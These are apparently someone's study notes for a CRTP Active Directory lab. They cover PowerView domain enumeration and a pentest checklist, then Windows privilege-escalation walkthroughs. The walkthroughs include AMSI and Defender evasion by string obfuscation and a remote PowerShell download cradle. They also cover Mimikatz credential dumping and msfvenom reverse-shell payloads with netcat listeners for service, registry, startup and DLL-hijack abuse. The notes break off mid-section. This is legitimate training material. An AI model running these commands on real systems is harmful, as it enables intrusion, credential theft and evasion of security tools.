# CRTP One Week Challenge

# PowerShell

Bypassing PowerShell Security using Invisi-Shell  (https://github.com/OmerYa/Invisi-Shell)
```
RunWithPathAsAdmin.bat  (Admin Privilege)
RunWithRegistryNonAdmin.bat  (non-Admin Privilege)
```

Load a script and module (local)
```
. C:\AD\Tools\PowerView.ps1
OR
Import-Module C:\AD\Tools\PowerView.ps1
```

list all the commands u can use in a particular module
```
Get-Command -Module <modulename>
```

Load a script and module (remotely)
-     ine (New-Object Net.WebClient).DownloadString('http://10.10.16.10/payload.ps1')

Bypassing AV Signatures for PowerShell
.      Invoke-Mimi & Invoke-MimiEx are the obfuscated tools of Invoke-Mimikatz
.      if u r going to run a PowerShell script from the disk it may get detected; u can use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected
.      Scan using AMSITrigger 'AmsiTrigger_x64.exe -i PowerUp.ps1' | Modify the detected code by reversing ex. 'System.AppDomain' to 'niamoDppA.metsyS' | Rescan using AMSITrigger | Repeat the steps till u get a result as "AMSI_RESULT_NOT_DETECTED"
.      u can use DefenderCheck (https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary / file that Windows Defender may flag
.      simply provide path to the script file to scan it
-     AmsiTrigger_x64.exe -i C:\AD\Tools\Invok-PowerShellTcp_Detected.ps1 DefenderCheck.exe PowerUp.ps1
.      for full obfuscation of PowerShell scripts use Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)
example of minimal obfuscation; if u run powerup.ps1 and the following line got detected "New-Object System.Net.Sockets.TCPClient($IP,$PORT)"
## Reverse the "Net.Sockets" string on line number 32
```
$string = "stekcoS.teN"
$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
if ($Reverse)
{
$client = New-Object System.$class.TCPClient($IPAddress,$PORT)
}
```

# Methodology Master
---
## 0. Miscellaneous
> 1. [ ] Remember to bypass AMSI on every new user
> 2. [ ] Check the Execution policy language mode
> 3. [ ] Check all the commands you are allowed to execute

## 1. Domain Enumeration
> 1. [ ] Complete basic Enum
> 2. [ ] enumerate all users
> 3. [ ] enumerate all domain computers
> 4. [ ] GPO && OU
> 5. [ ] ACL's 
> 6. [ ] Trusts
> 7. [ ] Blood-hound
> 8. [ ] SPN

## 2. Local Priv Esc
> 1. [ ] Run *powerups.ps1*
> 2. [ ] **ServiceUnquoted**
> 3. [ ] **ModifiableServiceFile**
> 4. [ ] **ModifiableService**
> 5. [ ] Priv Esc for the above use : **Invoke-ServiceAbuse**
> 6. [ ] **whoami /all** || **whoami /priv**
> 7. [ ] Check Windows abuse and priv esc
> 8. [ ] Hunt for Local Admin users if available from Trust Enum
> 9. [ ] Priv Esc for the above use : PSsession or refer **Invoke-Command**
> 10. [ ] Check if you can Priv esc using *jenkins*
> 11. [ ] Lastly add the user to the localgroup administrators

**NOTE : ONCE A LOCAL ADMINISTRATOR RUN PS as ADMINISTRATOR**

## 3. Domain Admin Priv Esc
> 1. [ ] Hunt for Local Admin Users
> 2. [ ] Check The local Admin Access
> 3. [ ] If yes, Use **Invoke-Command** or **Enter-PSSession**

## 4. Domain Admin Persistence [app locker enabled]
> 1. [ ] Check the Execution policy language mode
> 2. [ ] Checking AppLockerPolicy and note the paths available for us
> 3. [ ] Disable Defender protections
> 4. [ ] Modify Invoke-Mimikatz.ps1 script to call the function in the script itself because we can't dot source files if in constrained language mode
> 5. [ ] run script without dot sourcing it
> 6. [ ] Dump the hashes
> 7. [ ] Get the ekeys
> 8. [ ] Get Credentials from the credentials vault

## 5. Domain Admin Persistence
> 1. [ ] Dump the hashes us the user using *Invoke-Mimikatz*
> 2. [ ] Get the ekeys
> 3. [ ] Get Credentials from the credentials vault
> 4. [ ] Using *Over-Pass-the-Hash Attack* spawn a PowerShell session as that user

## 6. New user from DA Priv Esc
> 1. [ ] Follow the same exact steps from **3. to 5.** if a new user is found

## 7. DC pwn
> 1. [ ] After we get a DA user with Administrator access we can connect to the DC using **Enter-PSSession**

## 8. Domain Controller Persistence
> 1. [ ] Golden Ticket
> 2. [ ] Silver Ticket
> 3. [ ] DSRM
> 4. [ ] ACL AdminSDHolder
> 5. [ ] ACL DCSync
> 6. [ ] ACL security Descriptors

## 9. Forest Priv Esc

> 1. [ ] Forge inter-forest ticket by trust keys

---

# Domain Enumeration - Basic
Enumerate following for the dollarcorp domain:
> 1. [ ] Users
```
Get-DomainUser	#check the name at the end
Get-DomainUser | select -ExpandProperty samaccountname #list a specific property of all the users
```
> 2. [ ] Computers
```
Get-DomainComputer | select -ExpandProperty dnshostname #list computers
```
> 3. [ ] Domain Administrators
```
Get-DomainGroup | select name #list domain admin group name
Get-DomainGroup -Identity "Domain Admins" #details of the domain admins
Get-DomainGroupMember -Identity "Domain Admins" #enumerate members of the domain admins group. check MemberName & MemberSID
```
> 4. [ ] Enterprise Administrators
```
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local #enumerate enterprise admin. you can get the domain name from computer enum
```
- run Invisi-Shell then PowerView before Domain Enumeration (bypassing AMSI & loading PowerView)
```
RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
```
Get current domain
```
Get-NetDomain  #check name, Forest, DomainControllers, Children, Parent...
```
Get object of another domain
```
Get-NetDomain -Domain moneycorp.local
```
Get domain SID for the current domain  (security identifier)
```
Get-DomainSID  #will be used in other attacks
```
Get domain policy for the current domain
```
Get-DomainPolicy  
(Get-DomainPolicy)."Kerberos Policy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."System Access" #Password policy
(Get-DomainPolicy).PrivilegeRights #Check your privileges
```
Get domain policy for another domain
```
(Get-DomainPolicy -domain moneycorp.local)."system access"
(Get-DomainPolicy -domain moneycorp.local)."kerberos policy"
(Get-DomainPolicy -domain moneycorp.local)."Privilege Rights"
```
Get domain controllers for the current domain
```
Get-NetDomainController #check name
```
Get domain controllers for another domain
```
Get-NetDomainController -Domain moneycorp.local  #check name
```
Get a list of all users in the current domain
```
Get-DomainUser  #list all users
Get-DomainUser -Identity student1  OR Get-DomainUser -Username student1  #select the information only for student1
Get-DomainUser -Identity student1 -Properties *  //maybe only for AD module u need to check
Get-DomainUser | select samaccountname,logonCount  #Get specific property of all users
Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description
```
Get list of all properties for users in the current domain
```
Get-UserProperty
Get-UserProperty -Properties pwdlastset,logoncount,badpwdcount
Get-UserProperty -Properties logoncount  #if the user has a low number of logons. user can be a decoy
Get-UserProperty -Properties badpwdcount
```
search for a particular string in a user's attributes (Description)
```
Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description
Find-UserField -SearchField Description -SearchTerm "built"
```
Get a list of computers in the current domain
```
Get-DomainComputer  #get all computers
Get-DomainComputer | select cn,logonCount
Get-DomainComputer -OperatingSystem "*Server 2016*"
Get-DomainComputer -Ping  #check if the machine is alive or not. if firewall is on this may give u a false positive
Get-DomainComputer -FullData  #list of all data including SID
```
Get all the groups in the current domain
Enterprise admin group  won't be listed cause it's at the root of the forest
```
Get-DomainGroup | select name
Get-DomainGroup -Domain <targetdomain> | select cn
Get-DomainGroup -FullData
Get-NetComputer -Domain
```
Get all groups containing the word "admin" in group name
Enterprise admin group  won't be listed cause it's at the root of the forest
```
Get-DomainGroup *admin*
Get-DomainGroup -GroupName *admin*  #all groups with admin name (excluding the root of the forest)
Get-DomainGroup -GroupName *admin* -Doamin moneycorp.local  #check the forest root (this will return enterprise admin group)
Get-DomainGroup *Domain Admins* -FullData  #get full data of the domain admin group
```
Get all the members of the Domain Admins group
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse  # check the name & always check the RID in SID if it is 500; if yes means the user is admin
Get-DomainGroup -GroupName 'Enterprise Admins' -Domain moneycorp.local (we added the domain to check the root as well)
Get-DomainGroup -GroupName 'Administrators'  #check the MemberName & IsGroup; if IsGroup is false means this is a user
Get-DomainGroupMember -GroupName 'Administrators' -Recurse  #Enum the membership of a group from the above command
```
Get the group membership for a user
opposite to the above command
```
Get-DomainGroup -UserName "student1" | select name
```
List all the local groups on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroup -computerName dcorp-dc
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local  #membership of the groups on the domain controller
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups  #list groups on the domain controller
```
Get members of all the local groups on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
```
Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
```
Get actively logged users on a computer (needs local admin rights on the target)
```
Get-NetLoggedon -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
```
Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
```
Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
```
Get the last logged user on a computer (needs administrative rights and remote registry on the target)
```
Get-LastLoggedon -ComputerName <servername>
```
Find shares on hosts in the current domain.
```
Invoke-ShareFinder -Verbose
Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC  #Exclude common or default shares
```
Find sensitive files on computers in the domain
```
Invoke-FileFinder -Verbose
```
Get all fileservers of the domain
```
Get-NetFileServer -Verbose
```
Enumerate Enterprise Administrators
```
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

---

# Domain Enumeration - Group Policy Object Enumeration
Enumerate the following for the dollarcorp domain:
> 1. [ ] List all the OUs
```
Get-DomainOU #check the name in the output
Get-DomainOU | select -ExpandProperty name #see only the names
```
> 2. [ ] List all the computers in the StudentMachines OU
```
(Get-DomainOU -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
> 3. [ ] List the GPOs
```
Get-DomainGPO
```
> 4. [ ] Enumerate GPO applied on the StudentMachines OU
```
Get-DomainGPO -Identity "{AB306569-220D-43FF-BO3B-83E8F4EF8081}"
```
Get list of GPO in current domain.
```
Get-DomainGPO | select displayname  #display all policies
Get-DomainGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.local  #check if any of the GPO applied on particular machine. check displayname ex. students policy is applied on the machine
```
List all the computer in the StudentMachines OU
```
(Get-Domain -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
Get GPO(s) which use Restricted Groups or groups.xml for interesting users
```
Get-DomainGPOLocalGroup
```
Get users who are in a local group of a machine using GPO
```
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcop-student1
```
Get machines where the given user is member of a specific group
```
Get-DomainGPOUserLocalGroupMapping -Identity student -Verbose
```
Get OUs in a domain
```
Get-DomainOU -FullData  #list of organizational unit in the domain
```
Get GPO applied on an OU. Read GPOName from gplink attribute from Get-NetOU
```
Get-DomainGPO -Identity "{AB306569-220D-43FF-BO3B-83E8F4EF8081}"  #group policy that is applied on the OU. check displayname ex. group policy student is applied
```

# Domain Enumeration - Access Control List Enumeration  (better to use bloodhound)
ACL is a list of Access Control Entries (ACE) - ACE corresponds to individual permission or audits. who has permission and what can be done
- DACL - Defines the permissions trustees.
- SACL - Logs success and failure audit messages when an object is accessed.
> 1. [ ] ACL for the Domain Admins group
```
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose #check ObjectAceType
```
> 2. [ ] Check all modify rights/permissions for the studentx
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"}
```
> 3. [ ] Check modify rights/permissions for the studentx in RDPUsers group as user is a member of it
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
Get the ACLs associated with the specified object (groups)
```
Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs  #get a list of Aces from student1. check ObjectDN, IdentityReference, ActiveDirectoryRights
```
Get the ACLs associated with the specified prefix to be used for search
```
Get-DomainObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose
```
We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs
won't work in PowerView
```
(Get-Acl "AD:\CN=Administrator, CN=Users, DC=dollarcorp, DC=moneycorp,DC=local").Access
```
Get the ACLs associated with the specified LDAP path to be used for search
```
Get-DomainObjectAcl -SearchBase 'LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local' -ResolveGUIDs -Verbose
```
Search for interesting ACEs
```
Find-InterestingDomainAcl -ResolveGUIDs
```
Get the ACLs associated with the specified path
```
Get-PathAcl -Path "\\dc.mydomain.local\sysvol" 
```

# Domain Enumeration - Trusts Enumeration

> 1. [ ] Enumerate all domains in the moneycorp.local forest
```
Get-ForestDomain -Verbose #enumerate all domains in the current forest. check name
```
> 2. [ ] Map the trusts of the dollarcorp.moneycorp.local domain
```
Get-DomainTrust #check SourceName, TargetName, TrustsAttributes, and TrustDirection
```
> 3. [ ] Map External trusts in meneycorp.local forest
```
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"} #check TrustAttributes
``` 
> 4. [ ] Identify external trusts of dollarcorp domain. can you enumerate trusts for a trusting forest?
```
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"} #check TrustAttribut
```
> 5. [ ] Enumerate trusts for eurocop.local forest
```
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```
Get a list of all domain trusts for the current domain
```
Get-DomainTrust  #check trust relationship
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local  #check the trust for different domain
```
Get details about the current forest
```
Get-Forest  #get the details about forest. check domains, GlobalCatalogs
Get-Forest -Forest eurocorp.local  #get the details about different forest. check domains, GlobalCatalogs
```
Get all domains in the current forest
```
Get-ForestDomain  #list of domains in the current forest
Get-ForestDomain -Forest eurocorp.local  #list of domains in different forest
```
Get all global catalogs for the current forest
```
Get-ForestGlobalCatalog  #check global catalogs of the current forest
Get-ForestGlobalCatalog -Forest eurocorp.local  #check global catalogs of different forest
```
Map trusts of a forest
```
Get-ForestTrust  #if u get nothing means there is no forest relationship trust in the current forest
Get-ForestTrust -Forest eurocorp.local  #check the forest relationship trust for external forest 
```
Map External trusts in meneycorp.local forest
```
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

# User Hunting
Find all machines on the current domain where the current user has local admin access (admin access in another machine)
```
Find-LocalAdminAccess -Verbose
```
Find computers where a domain admin (or specified user/group) has sessions
```
powershell -ep bypass   #If u get an error module can't be loaded
. C:\AD\Tools\Invoke-SessionHunter.ps1
Invoke-SessionHunter
OR
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
```
To confirm admin access
```
Invoke-UserHunter -CheckAccess
```
Find computers where a domain admin is logged in
```
Invoke-UserHunter -Stealth  #Will only go to the high-value targets
```
Get users with privileges in other domains inside the forest
```
Get-DomainForeingUser 
```
Get groups with privileges in other domains inside the forest
```
Get-DomainForeignGroupMember 
```

# Active Directory - Local Privilege Escalation

# <span style="color:lightblue">Autorun</span>

## <span style="color:lightgreen"><span style="color:lightgreen">Methodology</span></span>

Autorun is a type of Registry Escalation.

To ensure that the IT department creates a secure environment, Windows administrators often need to know what kind of access specific users or groups have to resources, including files, directories, Registry keys, global objects, and Windows services. AccessChk quickly answers these questions with an intuitive interface and output.

So basically, we can say a particular application in a specific directory gets automatically executed with administrator privileges once he logs on. This can be abused by finding the path location and dropping our malicious executable file through which we will gain administrator access.

## <span style="color:lightgreen">Detection</span>

### Using Autoruns and AccessChk

1. Transfer [Autoruns64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) on the Windows/AD machine and execute it on cmd
```console
C:\Temp> Autoruns64.exe
```
![image](https://user-images.githubusercontent.com/59029171/161002365-bde92ae0-b7f4-4978-b2eb-44498e6c42fb.png)

2. In Autoruns, click on the `"Logon"` tab.
3. From the listed results, notice that the `"My Program"` entry is pointing to `"C:\Program Files\Autorun Program\program.exe"`.
4. Go back to the command prompt run [AccessChk64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)

```console
C:\Temp> accesschk64.exe -wvu "C:\Program Files\Autorun Program"

# Switch meaning
# w --> only show items that have write access
# v --> verbose; dispaly as many details as possible
# u --> ignore the errors
```

![image](https://user-images.githubusercontent.com/59029171/161004322-76f2e4e8-876c-4c00-abf5-7e0be381fdfd.png)

### Using PowerUp

1. Run [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) and Run `Invoke-AllChecks` (check the autoruns field)

```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```
![image](https://user-images.githubusercontent.com/59029171/161005302-73ecbb10-e186-4a84-b086-c271976655f5.png)

From the output, notice that the `"Everyone"` user group has `"FILE_ALL_ACCESS"` permission on the `"program.exe"` file. To gain administrator access, we can drop our malicious executable file by overwriting on the file.

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o program.exe
```
3. Transfer the generated file, `program.exe`, to the Windows VM.

### Windows VM

1. replace `program.exe` in `'C:\Program Files\Autorun Program'`

### Kali VM

1. Wait for a reverse shell on your kali machine.


# <span style="color:lightblue">AlwaysInstallElevated</span>

## <span style="color:lightgreen">Methodology</span>

AlwaysInstallElevated  is a type of Registry Escalation.

This option is equivalent to granting full administrative rights, which can pose a massive security risk. Microsoft strongly discourages the use of this setting.

To install a package with elevated (system) privileges, set the AlwaysInstallElevated value to "1" under both of the following registry keys:
```console
HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```
If the AlwaysInstallElevated value is not set to "1" under both of the preceding registry keys, the installer uses elevated privileges to install managed applications and uses the current user's privilege level for unmanaged applications.

## <span style="color:lightgreen">Detection</span>
### Windows VM

1. Open command prompt and type: 
```console
C:\Temp> reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```
+ `0x1` means its ON
![image](https://user-images.githubusercontent.com/59029171/161007111-57c898d9-d830-45a5-9a2c-f9e867f6c58b.png)

2. In command prompt type: 
```console
C:\Temp>reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```
+ `0x1` means its ON
![image](https://user-images.githubusercontent.com/59029171/161007974-38e7b355-0c5e-49ff-9886-6878bbbe86a6.png)

From the both output, we notice that `“AlwaysInstallElevated”` value is `1`. Hence, we can abuse this function to get privilege escalation.

### Using PowerUp

1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the AlwaysInstallElevated field)
```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```

![image](https://user-images.githubusercontent.com/59029171/161008622-848721f3-ddf2-4c17-af2a-a8e7f592a3e1.png)

2. Run `Write-UserAddMSI` and Add backdoor user in *Administrators* group (Required RDP access)

![image](https://user-images.githubusercontent.com/59029171/161009230-2b8b4782-60cc-4301-b1ac-d9595b34c392.png)

3. Check local Administrators
```console
C:\Temp> net localgroup administrators
# now backdoor is added to the localgroup administrators group
```

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```
2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f msi -o setup.msi
```
3. Copy the generated file, `setup.msi`, to the Windows VM.

### Windows VM

1. Place `'setup.msi'` in `'C:\Temp'`
2. Open command prompt and type: 
```console
C:\Temp> msiexec /quiet /qn /i C:\Temp\setup.msi
```

### Kali VM

1. Wait for a reverse shell on your kali machine.


# <span style="color:lightblue">Service Registry</span>

## <span style="color:lightgreen">Methodology</span>
A service registry consists of a cluster of servers that use a replication protocol to maintain consistency. Hence if we get Full Contol permission over the registry key, we can drop our malicious executable file to gain administrator access. 

## <span style="color:lightgreen">Detection</span>

### Windows VM

1. Open powershell prompt and type: 
```powershell
C:\Temp> powershell -ep bypass
PS C:\Temp> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```
![image](https://user-images.githubusercontent.com/59029171/161015556-54353fa3-1278-451d-999e-38c3cc762f75.png)

2. Notice that the output suggests that user belong to `"NT AUTHORITY\INTERACTIVE"` has `"FullContol"` permission over the registry key.

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o x.exe
```
3. Copy the generated file `x.exe`, to the Windows VM.

### Windows VM

1. Place `x.exe` in `'C:\Temp'`
2. Open command prompt at type: 
```console
C:\Temp> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```
3. In the command prompt type: 
```console
C:\Temp> sc start regsvc
# If it doesnt work try restaring the service and perform the exploit egain
```

![image](https://user-images.githubusercontent.com/59029171/161016977-7757f360-5b46-4201-949a-9338e79f5735.png)

### Kali VM

1. Wait for a reverse shell on your kali machine.


# <span style="color:lightblue">Executable Files</span>

## <span style="color:lightgreen">Methodology</span>
Microsoft Windows services, formerly known as NT services, enable you to create long-running executable applications that run in their own Windows sessions. These services can be automatically started when the computer boots, can be paused and restarted, and do not show any user interface.

Hence if we get Full Contol permission over the file path location, we can drop our malicious executable file to gain administrator access.

## <span style="color:lightgreen">Detection</span>

1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the service executable field)
```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```

![image](https://user-images.githubusercontent.com/59029171/161047964-59d53aa2-ebd2-4cb3-85e7-5e103e19c4e1.png)

We can see that we have Modifiable File access to `"c:\Program Files\File Permissions Service\filepermservice.exe"`. To gain administrator access, we can drop our malicious executable file on this location.

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o x.exe
```

3. Copy the generated file `x.exe`, to the Windows VM and replace it over  `filepermsvc.exe`.

### Windows VM

1. In command prompt type: 
```console
C:\Temp> sc start filepermsvc
```

### Kali VM

1. Wait for a reverse shell on your kali machine.

# <span style="color:lightblue">Startup Applications</span>

## <span style="color:lightgreen">Methodology</span>

Startup apps run in the background, the number of apps running on the system can be significantly more than what the user is aware of and affect system responsiveness. Startup apps are classified to include those leveraging these mechanisms to start:
+ Run registry keys (HKLM, HKCU, wow64 nodes included)
+ RunOnce registry keys
+ Startup folders under the start menu for per user and public locations

So basically, we need full access to the Startup folder. Then by dropping our malicious executable file, we will gain administrator access.

## <span style="color:lightgreen">Detection</span>

### Windows VM

1. Open command prompt and type: 
```console
C:\Temp> icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
![image](https://user-images.githubusercontent.com/59029171/161051050-c4b5745a-3040-4d65-8146-e67d66a3ffd3.png)

2. From the output notice that the `"BUILTIN\Users"` group has full access `'(F)'` to the directory.

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53  -f exe -o y.exe
```
3. Copy the generated file, `y.exe`, to the Windows VM.

### Windows VM

1. Place `y.exe` in `"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`.

### Kali VM

1. Wait for a reverse shell on your kali machine.

# <span style="color:lightblue">DLL Hijacking</span>

## <span style="color:lightgreen">Methodology</span>
Windows applications usually load DLL files when started. It may happen that a DLL file does not exist and the application is unable to load it. Nevertheless, an application will continue to execute as long as the missing DLL is not needed.  
In case the application uses a relative and not an absolute file path, Windows searches for the file in the following directories:

-   The directory from which the application is loaded
-   `C:\Windows\System32`
-   `C:\Windows\System`
-   `C:\Windows`
-   The current working directory
-   Directories in the system PATH environment variable
-   Directories in the user PATH environment variable

### Steps taken to perform DLL hijacking are outlined below.

1.  Identify vulnerable application and location
2.  Identify applications PID
3.  Identify vulnerable DLLs that can be hijacked
4.  Use MSFVenom or other payload creation tools to create a malicious DLL
5.  Replace the original DLL with the malicious DLL
6.  Profit

## <span style="color:lightgreen">Detection</span>

###  Windows VM (RDP is required)
1. Transfer [Procmon.exe](https://strontic.github.io/xcyclopedia/library/Procmon.exe-EB2A0D7AC44B9B66E884EE5087305ACC.html) on the Windows VM
2. Right click on `Procmon.exe` and select `'Run as administrator'` from the menu.
3. In procmon, select `"filter"`.  From the left-most drop down menu, select `'Process Name'`.
4. In the input box on the same line type: `dllhijackservice.exe`
5. Make sure the line reads “Process Name is `dllhijackservice.exe` then Include” and click on the `'Add'` button, then `'Apply'` and lastly on 'OK'.
6. Next, select from the left-most drop down menu `'Result'`.
7. In the input box on the same line type: `NAME NOT FOUND`.
8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the `'Add'` button, then `'Apply'` and lastly on 'OK'.

![image](https://user-images.githubusercontent.com/59029171/161053850-6638a245-75dd-43ea-bbe9-6fecd33ad4c5.png)
![image](https://user-images.githubusercontent.com/59029171/161053869-d2daa643-a03a-4956-a2f0-d5e74457d816.png)

9. Open command prompt and type: 
```console
C:\Temp> sc start dllsvc
```
![image](https://user-images.githubusercontent.com/59029171/161053895-44130b44-4f86-4fe7-8ed2-0f9721fb5896.png)

10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute `'C:\Temp\hijackme.dll'` yet it could not do that as the file was not found. Note that `'C:\Temp'` is a writable location.
![image](https://user-images.githubusercontent.com/59029171/161053920-4af50faa-c6ec-487e-9ec5-142907940e3c.png)

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f dll -o hijackme.dll
```

3. Copy the generated file `hijackme.dll`, to the Windows VM.

### Windows VM

1. Place `hijackme.dll` in` 'C:\Temp'`
2. Open command prompt and type: 
```console
C:\Temp> sc stop dllsvc & sc start dllsvc
```

### Kali VM

1. Wait for a reverse shell on your kali machine.


# <span style="color:lightblue">BinPath</span>

## <span style="color:lightgreen">Methodology</span>

BinPath is a type of Service Escalation. We can gain administrator privileges if we write access and restart access on any service. We can abuse this function by injecting our malicious BinPath to get executed once restarted.

## <span style="color:lightgreen">Detection</span>

### Using Script on Windows VM

1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the service permissions field)

```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```
![image](https://user-images.githubusercontent.com/59029171/161123056-908dbaa0-fced-490f-a158-9d2f20661d31.png)

### Checking manually on Windows VM

1. Run [AccessChk64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)

```console
C:\Temp> accesschk64.exe -uwcv Everyone *

# Switch meaning
# w --> only show items that have write access
# v --> verbose; dispaly as many details as possible
# u --> ignore the errors
# c --> displays service name of the following
# Everyone --> means everyone as a group who hass access
```
![image](https://user-images.githubusercontent.com/59029171/161123809-4f85ab02-1d83-46a8-8f9c-2be2fc85a43d.png)

2. Using [AccessChk64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) query the service found
```console
C:\Temp> accesschk64.exe -uwcv daclsvc
```
![image](https://user-images.githubusercontent.com/59029171/161124072-a5fb8b5e-5d0c-4cf5-8551-f63b33ad4b9d.png)

3. Find path of the bin file
```console
C:\Temp> sc qc daclsvc
```

![image](https://user-images.githubusercontent.com/59029171/161124205-51cf18ef-d3a8-457d-b65a-1545c310c7b9.png)

##  <span style="color:lightgreen">Exploitation</span>

### Kali VM
1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o reverse.exe
```
3. Copy the generated file `reverse.exe`, to the Windows VM.

### Windows VM

1. Place `reverse.exe` in` 'C:\Temp'`
2. In command prompt type: 
```console
C:\Temp> sc config daclsvc binpath= "C:\Temp\reverse.exe"
```
3. In command prompt type: 
```console
C:\Temp> sc start daclsvc
```

### Kali VM

1. Wait for a reverse shell on your kali machine.

# <span style="color:lightblue">Unquoted Service Paths</span>

## <span style="color:lightgreen">Methodology</span>

When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege).

In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument.

## <span style="color:lightgreen">Detection</span>

1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the unquoted service field)
```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```

![image](https://user-images.githubusercontent.com/59029171/161141363-e21f53f1-1e4c-4006-ade0-b30e7286f4af.png)

##  <span style="color:lightgreen">Exploitation</span>
### Kali VM

1. Start a netcat listener
```console
